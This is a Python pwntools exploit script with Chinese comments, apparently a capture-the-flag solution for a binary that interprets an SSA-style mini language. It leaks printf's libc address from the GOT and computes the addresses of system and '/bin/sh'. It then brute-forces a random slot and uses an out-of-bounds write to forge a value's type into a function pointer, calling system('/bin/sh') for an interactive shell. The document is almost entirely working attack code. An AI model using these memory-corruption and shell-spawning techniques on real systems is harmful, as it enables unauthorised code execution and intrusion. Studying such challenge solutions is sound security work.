#!/usr/bin/env python3
from pwn import *

context(log_level="debug", arch="amd64")

libc = ELF("./libc.so.6")

offset_printf_got = 0x8F10 - 0x9300  # printf@GOT - &values[0]
offset_system = libc.symbols["system"] - libc.symbols["printf"]
offset_binsh = next(libc.search(b"/bin/sh\x00")) - libc.symbols["printf"]


def cmd(io, c: str):
    io.sendlineafter(b"> ", c.encode())


attempt = 0
while True:
    attempt += 1
    log.info(f"尝试第 {attempt} 次...")

    try:
        io = process("./vuln_patched")
        # io = remote("localhost", 9999)
        context.log_level = "info"

        # 首块必须为 entry 块
        cmd(io, "label entry")
        # 泄漏 printf@libc 地址
        cmd(io, f"const 1 {offset_printf_got}")  # values[1] = offset to printf@GOT
        cmd(
            io, "add 2 42 1"
        )  # values[2] = &printf@GOT tips： 42 是猜测的 rand_slot，需要爆破到正确为止
        cmd(io, "load 3 2")  # values[3] = printf@libc
        # 计算 system@libc 和 "/bin/sh"@libc 地址
        cmd(io, f"const 4 {offset_system}")  # values[4] = offset_system
        cmd(io, "add 5 3 4")  # values[5] = system@libc
        cmd(io, f"const 6 {offset_binsh}")  # values[6] = offset_binsh
        cmd(io, "add 7 3 6")  # values[7] = "/bin/sh"@libc
        # 跳转到调用块
        cmd(io, "br haxx")

        # haxx 块，调用 system("/bin/sh")
        cmd(io, "label haxx")
        cmd(io, "phi 8 [5, entry] [5, entry]")  # values[8] = system@libc
        cmd(io, "phi 9 [7, entry] [7, entry]")  # values[9] = "/bin/sh"@libc
        # 跨槽位写入，修改 values[8].type = TYPE_FUNC
        # sizeof(SSAValue) = 12 (packed)
        # values[7]: offset 84-95
        # values[8]: offset 96-107
        #   [96-99]: type
        #   [100-107]: data (system@libc)
        # 7*12+8=92，从 offset 92 写入 8 字节，覆盖 values[7].data[4:8] 和 values[8].type
        cmd(io, "const 10 92")  # values[10] = offset(values[8].type) = 7*12+8
        cmd(io, "add 11 42 10")  # values[11] = &values[8].type
        cmd(io, f"const 12 {2 << 32}")  # values[12] = 2 << 32 = 0x0000000200000000
        cmd(io, "store 11 12")  # values[8].type = TYPE_FUNC
        cmd(io, "call 8 9")  # 调用 values[8](values[9]) → system("/bin/sh")
        cmd(io, "ret")

        # 执行 SSA 程序
        cmd(io, "run")

        # 等待程序执行完成
        io.recvuntil(b"[*] Executing program...\n", timeout=2)

        # 测试是否成功获取 shell
        result = io.recvline(timeout=1)

        if b"[!]" not in result and b"Program finished" not in result:
            log.success(f"成功！在第 {attempt} 次尝试后获得 shell")
            context(log_level="debug")
            io.interactive()
            break
        else:
            log.info(f"第 {attempt} 次失败，没有获得 shell，重试...")
            io.close()

    except EOFError:
        io.close()
